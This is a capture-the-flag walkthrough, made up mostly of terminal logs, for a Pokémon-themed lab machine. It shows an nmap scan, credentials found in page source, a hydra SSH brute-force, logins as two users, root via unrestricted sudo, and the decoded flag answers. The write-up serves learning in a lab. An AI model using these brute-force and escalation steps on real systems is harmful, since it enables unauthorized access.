```
root@kali:~# nmap -sC -sV -T4 -p- 10.10.195.253
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-12 14:18 UTC
Nmap scan report for ip-10-10-195-253.eu-west-1.compute.internal (10.10.195.253)
Host is up (0.0084s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 58:14:75:69:1e:a9:59:5f:b2:3a:69:1c:6c:78:5c:27 (RSA)
|   256 23:f5:fb:e7:57:c2:a5:3e:c2:26:29:0e:74:db:37:c2 (ECDSA)
|_  256 f1:9b:b5:8a:b9:29:aa:b6:aa:a2:52:4a:6e:65:95:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Can You Find Them All?
MAC Address: 02:3D:77:7A:DB:87 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.75 seconds
root@kali:~#
```


```html
    <script type="text/javascript">
    	const randomPokemon = [
    		'Bulbasaur', 'Charmander', 'Squirtle',
    		'Snorlax',
    		'Zapdos',
    		'Mew',
    		'Charizard',
    		'Grimer',
    		'Metapod',
    		'Magikarp'
    	];
    	const original = randomPokemon.sort((pokemonName) => {
    		const [aLast] = pokemonName.split(', ');
    	});

    	console.log(original);
    </script>

    <pokemon>:<hack_the_pokemon>
    <!--(Check console for extra surprise!)-->
```

```
   		'Bulbasaur', 'Charmander', 'Squirtle',
    		'Snorlax',
    		'Zapdos',
    		'Mew',
    		'Charizard',
    		'Grimer',
    		'Metapod',
    		'Magikarp'
    	];
```

```
root@kali:~# hydra -L user_or_pass.txt -P user_or_pass.txt 10.10.195.253 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-12 14:29:14
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 144 login tries (l:12/p:12), ~9 tries per task
[DATA] attacking ssh://10.10.195.253:22/
[22][ssh] host: 10.10.195.253   login: pokemon   password: hack_the_pokemon
```

# ssh
```
root@kali:~# ssh pokemon@10.10.195.253
The authenticity of host '10.10.195.253 (10.10.195.253)' can't be established.
ECDSA key fingerprint is SHA256:mXXTCQORSu35gV+cSi+nCjY/W0oabQFNjxuXUDrsUHI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.195.253' (ECDSA) to the list of known hosts.
pokemon@10.10.195.253's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

84 packages can be updated.
0 updates are security updates.

New release '18.04.4 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

pokemon@root:~$ ls -al
total 120
drwxr-xr-x 19 pokemon pokemon 4096 Aug 12 10:17 .
drwxr-xr-x  4 root    root    4096 Jun 22 23:21 ..
-rw-------  1 pokemon pokemon    0 Aug 11 11:17 .bash_history
-rw-r--r--  1 pokemon pokemon  257 Aug 11 11:09 .bash_logout
-rw-r--r--  1 pokemon pokemon 4046 Aug 12 10:30 .bashrc
drwx------ 15 pokemon pokemon 4096 Aug 12 10:28 .cache
drwx------  3 pokemon pokemon 4096 Jun 22 20:00 .compiz
drwx------ 15 pokemon pokemon 4096 Jun 22 19:58 .config
drwx------  3 root    root    4096 Jun 22 22:50 .dbus
drwxr-xr-x  2 pokemon pokemon 4096 Jun 24 14:58 Desktop
-rw-r--r--  1 pokemon pokemon   25 Jun 22 22:56 .dmrc
drwxr-xr-x  2 pokemon pokemon 4096 Jun 22 19:46 Documents
drwxr-xr-x  2 pokemon pokemon 4096 Jun 22 19:46 Downloads
-rw-r--r--  1 pokemon pokemon 8980 Jun 22 19:36 examples.desktop
drwx------  2 pokemon pokemon 4096 Jun 22 19:46 .gconf
drwx------  3 pokemon pokemon 4096 Aug 12 10:17 .gnupg
-rw-------  1 pokemon pokemon 3410 Aug 12 10:17 .ICEauthority
drwx------  3 pokemon pokemon 4096 Jun 22 19:46 .local
drwx------  5 pokemon pokemon 4096 Jun 22 19:52 .mozilla
drwxr-xr-x  2 pokemon pokemon 4096 Jun 22 19:46 Music
drwxrwxr-x  2 pokemon pokemon 4096 Aug 11 11:04 .nano
drwxr-xr-x  2 pokemon pokemon 4096 Jun 22 19:46 Pictures
-rw-r--r--  1 pokemon pokemon  655 Jun 22 19:36 .profile
drwxr-xr-x  2 pokemon pokemon 4096 Jun 22 19:46 Public
-rw-r--r--  1 pokemon pokemon    0 Jun 22 19:47 .sudo_as_admin_successful
drwxr-xr-x  2 pokemon pokemon 4096 Jun 22 19:46 Templates
drwxr-xr-x  3 pokemon pokemon 4096 Jun 22 23:10 Videos
-rw-------  1 pokemon pokemon   49 Aug 12 10:17 .Xauthority
-rw-------  1 pokemon pokemon   82 Aug 12 10:17 .xsession-errors
-rw-------  1 pokemon pokemon 1250 Aug 11 13:21 .xsession-errors.old
pokemon@root:~$ find / -name "*grace*" -type f 2>/dev/null
/var/lib/app-info/icons/ubuntu-xenial-universe/64x64/grace_grace.png
/lib/modules/4.15.0-112-generic/kernel/fs/nfs_common/grace.ko
/lib/modules/4.15.0-106-generic/kernel/fs/nfs_common/grace.ko
/lib/modules/4.15.0-45-generic/kernel/fs/nfs_common/grace.ko
/usr/share/app-install/icons/grace.svg
/usr/share/app-install/desktop/grace:grace.desktop
pokemon@root:~$ find / -name "*grass*" -type f 2>/dev/null
/var/lib/app-info/icons/ubuntu-xenial-universe/64x64/grass-core_grass70.png
/usr/share/app-install/icons/grass70.png
/usr/share/app-install/desktop/epigrass:epigrass.desktop
/usr/share/app-install/desktop/grass-core:grass70.desktop
pokemon@root:~$ cd Desktop/
pokemon@root:~/Desktop$ ls -al
total 12
drwxr-xr-x  2 pokemon pokemon 4096 Jun 24 14:58 .
drwxr-xr-x 19 pokemon pokemon 4096 Aug 12 10:17 ..
-rw-rw-r--  1 pokemon pokemon  383 Jun 22 22:40 P0kEmOn.zip
pokemon@root:~/Desktop$ unzip P0kEmOn.zip
Archive:  P0kEmOn.zip
   creating: P0kEmOn/
  inflating: P0kEmOn/grass-type.txt
pokemon@root:~/Desktop$ ls -al
total 16
drwxr-xr-x  3 pokemon pokemon 4096 Aug 12 10:32 .
drwxr-xr-x 19 pokemon pokemon 4096 Aug 12 10:17 ..
drwxrwxr-x  2 pokemon pokemon 4096 Jun 22 22:37 P0kEmOn
-rw-rw-r--  1 pokemon pokemon  383 Jun 22 22:40 P0kEmOn.zip
pokemon@root:~/Desktop$ cat P0kEmOn/grass-type.txt
50 6f 4b 65 4d 6f 4e 7b 42 75 6c 62 61 73 61 75 72 7dpokemon@root:~/Desktop$
```


```
pokemon@root:~$ ls -al
total 120
drwxr-xr-x 19 pokemon pokemon 4096 Aug 12 10:17 .
drwxr-xr-x  4 root    root    4096 Jun 22 23:21 ..
-rw-------  1 pokemon pokemon    0 Aug 11 11:17 .bash_history
-rw-r--r--  1 pokemon pokemon  257 Aug 11 11:09 .bash_logout
-rw-r--r--  1 pokemon pokemon 4046 Aug 12 10:30 .bashrc
drwx------ 15 pokemon pokemon 4096 Aug 12 10:28 .cache
drwx------  3 pokemon pokemon 4096 Jun 22 20:00 .compiz
drwx------ 15 pokemon pokemon 4096 Jun 22 19:58 .config
drwx------  3 root    root    4096 Jun 22 22:50 .dbus
drwxr-xr-x  3 pokemon pokemon 4096 Aug 12 10:32 Desktop
-rw-r--r--  1 pokemon pokemon   25 Jun 22 22:56 .dmrc
drwxr-xr-x  2 pokemon pokemon 4096 Jun 22 19:46 Documents
drwxr-xr-x  2 pokemon pokemon 4096 Jun 22 19:46 Downloads
-rw-r--r--  1 pokemon pokemon 8980 Jun 22 19:36 examples.desktop
drwx------  2 pokemon pokemon 4096 Jun 22 19:46 .gconf
drwx------  3 pokemon pokemon 4096 Aug 12 10:17 .gnupg
-rw-------  1 pokemon pokemon 3410 Aug 12 10:17 .ICEauthority
drwx------  3 pokemon pokemon 4096 Jun 22 19:46 .local
drwx------  5 pokemon pokemon 4096 Jun 22 19:52 .mozilla
drwxr-xr-x  2 pokemon pokemon 4096 Jun 22 19:46 Music
drwxrwxr-x  2 pokemon pokemon 4096 Aug 11 11:04 .nano
drwxr-xr-x  2 pokemon pokemon 4096 Jun 22 19:46 Pictures
-rw-r--r--  1 pokemon pokemon  655 Jun 22 19:36 .profile
drwxr-xr-x  2 pokemon pokemon 4096 Jun 22 19:46 Public
-rw-r--r--  1 pokemon pokemon    0 Jun 22 19:47 .sudo_as_admin_successful
drwxr-xr-x  2 pokemon pokemon 4096 Jun 22 19:46 Templates
drwxr-xr-x  3 pokemon pokemon 4096 Jun 22 23:10 Videos
-rw-------  1 pokemon pokemon   49 Aug 12 10:17 .Xauthority
-rw-------  1 pokemon pokemon   82 Aug 12 10:17 .xsession-errors
-rw-------  1 pokemon pokemon 1250 Aug 11 13:21 .xsession-errors.old
pokemon@root:~$ pwd
/home/pokemon
pokemon@root:~$ cat .bash_history
pokemon@root:~$ ls -al Documents/
total 8
drwxr-xr-x  2 pokemon pokemon 4096 Jun 22 19:46 .
drwxr-xr-x 19 pokemon pokemon 4096 Aug 12 10:17 ..
pokemon@root:~$ ls -al Downloads/
total 8
drwxr-xr-x  2 pokemon pokemon 4096 Jun 22 19:46 .
drwxr-xr-x 19 pokemon pokemon 4096 Aug 12 10:17 ..
pokemon@root:~$ ls -al Music/
total 8
drwxr-xr-x  2 pokemon pokemon 4096 Jun 22 19:46 .
drwxr-xr-x 19 pokemon pokemon 4096 Aug 12 10:17 ..
pokemon@root:~$ ls -al Pictures/
total 8
drwxr-xr-x  2 pokemon pokemon 4096 Jun 22 19:46 .
drwxr-xr-x 19 pokemon pokemon 4096 Aug 12 10:17 ..
pokemon@root:~$ ls -al Public/
total 8
drwxr-xr-x  2 pokemon pokemon 4096 Jun 22 19:46 .
drwxr-xr-x 19 pokemon pokemon 4096 Aug 12 10:17 ..
pokemon@root:~$ ls -al Templates/
total 8
drwxr-xr-x  2 pokemon pokemon 4096 Jun 22 19:46 .
drwxr-xr-x 19 pokemon pokemon 4096 Aug 12 10:17 ..
pokemon@root:~$ ls -al Videos/
total 12
drwxr-xr-x  3 pokemon pokemon 4096 Jun 22 23:10 .
drwxr-xr-x 19 pokemon pokemon 4096 Aug 12 10:17 ..
drwxrwxr-x  3 pokemon pokemon 4096 Jun 22 23:10 Gotta
pokemon@root:~$ ls -al Videos/Gotta/
total 12
drwxrwxr-x 3 pokemon pokemon 4096 Jun 22 23:10 .
drwxr-xr-x 3 pokemon pokemon 4096 Jun 22 23:10 ..
drwxrwxr-x 3 pokemon pokemon 4096 Jun 22 23:10 Catch
pokemon@root:~$ ls -al Videos/Gotta/Catch/
total 12
drwxrwxr-x 3 pokemon pokemon 4096 Jun 22 23:10 .
drwxrwxr-x 3 pokemon pokemon 4096 Jun 22 23:10 ..
drwxrwxr-x 3 pokemon pokemon 4096 Jun 22 23:11 Them
pokemon@root:~$ ls -al Videos/Gotta/Catch/Them/
total 12
drwxrwxr-x 3 pokemon pokemon 4096 Jun 22 23:11 .
drwxrwxr-x 3 pokemon pokemon 4096 Jun 22 23:10 ..
drwxrwxr-x 2 pokemon pokemon 4096 Jun 22 23:14 ALL!
pokemon@root:~$ ls -al Videos/Gotta/Catch/Them/ALL\!/
total 12
drwxrwxr-x 2 pokemon pokemon 4096 Jun 22 23:14 .
drwxrwxr-x 3 pokemon pokemon 4096 Jun 22 23:11 ..
-rw-r--r-- 1 pokemon root      78 Jun 22 23:14 Could_this_be_what_Im_looking_for?.cplusplus
pokemon@root:~$ cat Videos/Gotta/Catch/Them/ALL\!/Could_this_be_what_Im_looking_for\?.cplusplus
# include <iostream>

int main() {
        std::cout << "ash : pikapika"
        return 0;
}pokemon@root:~$ sudo -l
[sudo] password for pokemon:
Sorry, user pokemon may not run sudo on root.
pokemon@root:~$ ls -al ../
total 20
drwxr-xr-x  4 root    root    4096 Jun 22 23:21 .
drwxr-xr-x 24 root    root    4096 Aug 11 11:07 ..
drwx------  6 root    root    4096 Jun 24 14:14 ash
drwxr-xr-x 19 pokemon pokemon 4096 Aug 12 10:17 pokemon
-rwx------  1 ash     root       8 Jun 22 23:21 roots-pokemon.txt
pokemon@root:~$ ls -al ../ash/
ls: cannot open directory '../ash/': Permission denied
pokemon@root:~$ cat ../roots-pokemon.txt
cat: ../roots-pokemon.txt: Permission denied
```

```
root@kali:~# ssh ash@10.10.195.253
ash@10.10.195.253's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

84 packages can be updated.
0 updates are security updates.

New release '18.04.4 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Could not chdir to home directory /home/ash: Permission denied
$ ls -al
total 108
drwxr-xr-x  24 root root  4096 Aug 11 11:07 .
drwxr-xr-x  24 root root  4096 Aug 11 11:07 ..
drwxr-xr-x   2 root root  4096 Jun 24 13:46 bin
drwxr-xr-x   3 root root  4096 Aug 11 11:07 boot
drwxrwxr-x   2 root root  4096 Jun 22 19:35 cdrom
drwxr-xr-x  17 root root  3720 Aug 12 10:17 dev
drwxr-xr-x 135 root root 12288 Aug 11 13:14 etc
drwxr-xr-x   4 root root  4096 Jun 22 23:21 home
lrwxrwxrwx   1 root root    34 Aug 11 11:07 initrd.img -> boot/initrd.img-4.15.0-112-generic
lrwxrwxrwx   1 root root    34 Aug 11 11:07 initrd.img.old -> boot/initrd.img-4.15.0-106-generic
drwxr-xr-x  22 root root  4096 Jun 22 19:37 lib
drwxr-xr-x   2 root root  4096 Aug 11 11:05 lib64
drwx------   2 root root 16384 Jun 22 19:29 lost+found
drwxr-xr-x   2 root root  4096 Feb 26  2019 media
drwxr-xr-x   2 root root  4096 Feb 26  2019 mnt
drwxr-xr-x   3 root root  4096 Jun 22 19:57 opt
dr-xr-xr-x 171 root root     0 Aug 12 10:17 proc
drwx------   4 root root  4096 Jun 22 23:02 root
drwxr-xr-x  26 root root   840 Aug 12 10:39 run
drwxr-xr-x   2 root root 12288 Aug 11 11:05 sbin
drwxr-xr-x   2 root root  4096 Jun 22 19:46 snap
drwxr-xr-x   2 root root  4096 Feb 26  2019 srv
dr-xr-xr-x  13 root root     0 Aug 12 10:17 sys
drwxrwxrwt  11 root root  4096 Aug 12 10:38 tmp
drwxr-xr-x  11 root root  4096 Feb 26  2019 usr
drwxr-xr-x  15 root root  4096 Jun 22 22:23 var
lrwxrwxrwx   1 root root    31 Aug 11 11:07 vmlinuz -> boot/vmlinuz-4.15.0-112-generic
lrwxrwxrwx   1 root root    31 Aug 11 11:07 vmlinuz.old -> boot/vmlinuz-4.15.0-106-generic
$ cd /home
$ ls
ash  pokemon  roots-pokemon.txt
$ cd asj
-sh: 4: cd: can't cd to asj
$ cd ash
-sh: 5: cd: can't cd to ash
$ cd ash
-sh: 6: cd: can't cd to ash
$ ls -al
total 20
drwxr-xr-x  4 root    root    4096 Jun 22 23:21 .
drwxr-xr-x 24 root    root    4096 Aug 11 11:07 ..
drwx------  6 root    root    4096 Jun 24 14:14 ash
drwxr-xr-x 19 pokemon pokemon 4096 Aug 12 10:17 pokemon
-rwx------  1 ash     root       8 Jun 22 23:21 roots-pokemon.txt
$ cat roots-pokemon.txt
Pikachu!$ sudo -l
[sudo] password for ash:
Matching Defaults entries for ash on root:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ash may run the following commands on root:
    (ALL : ALL) ALL
$ sudo /bin/sh
# whoami
root
# ls -al
total 20
drwxr-xr-x  4 root    root    4096 Jun 22 23:21 .
drwxr-xr-x 24 root    root    4096 Aug 11 11:07 ..
drwx------  6 root    root    4096 Jun 24 14:14 ash
drwxr-xr-x 19 pokemon pokemon 4096 Aug 12 10:17 pokemon
-rwx------  1 ash     root       8 Jun 22 23:21 roots-pokemon.txt
# cd ash
# ls
# ls -al
total 24
drwx------ 6 root root 4096 Jun 24 14:14 .
drwxr-xr-x 4 root root 4096 Jun 22 23:21 ..
drwx------ 3 root root 4096 Jun 24 14:14 .cache
drwx------ 5 root root 4096 Jun 24 14:14 .config
drwx------ 3 root root 4096 Jun 24 14:13 .dbus
drwxr-xr-x 3 root root 4096 Jun 24 14:14 .local
# cd /root
# ls -al
total 28
drwx------  4 root root 4096 Jun 22 23:02 .
drwxr-xr-x 24 root root 4096 Aug 11 11:07 ..
-rw-------  1 root root  519 Jun 24 14:15 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Feb 26  2019 .cache
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Jun 22 22:54 .ssh
```

```
# find / -name "water*" -type f 2>/dev/null
/var/www/html/water-type.txt
/proc/sys/vm/watermark_scale_factor
/usr/lib/libreoffice/share/config/wizard/web/styles/water.css
/usr/lib/libreoffice/share/config/wizard/form/styles/water.css
# cat /var/www/html/water-type.txt
Ecgudfxq_EcGm
```

- rot14


```
# find / -name "fire*" -type f 2>/dev/null
/var/lib/app-info/icons/ubuntu-xenial-main/64x64/firefox_firefox.png
/var/lib/app-info/icons/ubuntu-xenial-updates-main/64x64/firefox_firefox.png
/var/lib/app-info/icons/ubuntu-xenial-security-universe/64x64/firewall-config_firewall-config.png
/var/lib/app-info/icons/ubuntu-xenial-universe/64x64/firewall-config_firewall-config.png
/var/lib/app-info/icons/ubuntu-xenial-security-main/64x64/firefox_firefox.png
/var/lib/app-info/icons/ubuntu-xenial-updates-universe/64x64/firewall-config_firewall-config.png
/var/lib/dpkg/info/firefox.postrm
/var/lib/dpkg/info/firefox.list
/var/lib/dpkg/info/firefox-locale-en.list
/var/lib/dpkg/info/firefox.preinst
/var/lib/dpkg/info/firefox.md5sums
/var/lib/dpkg/info/firefox.prerm
/var/lib/dpkg/info/firefox.conffiles
/var/lib/dpkg/info/firefox.postinst
/var/lib/dpkg/info/firefox-locale-en.md5sums
/etc/apport/blacklist.d/firefox
/etc/apport/native-origins.d/firefox
/etc/why_am_i_here?/fire-type.txt
```

```
# cat /etc/why_am_i_here?/fire-type.txt
UDBrM20wbntDaGFybWFuZGVyfQ==# echo UDBrM20wbntDaGFybWFuZGVyfQ== |base64 -d
P0k3m0n{Charmander}#
```
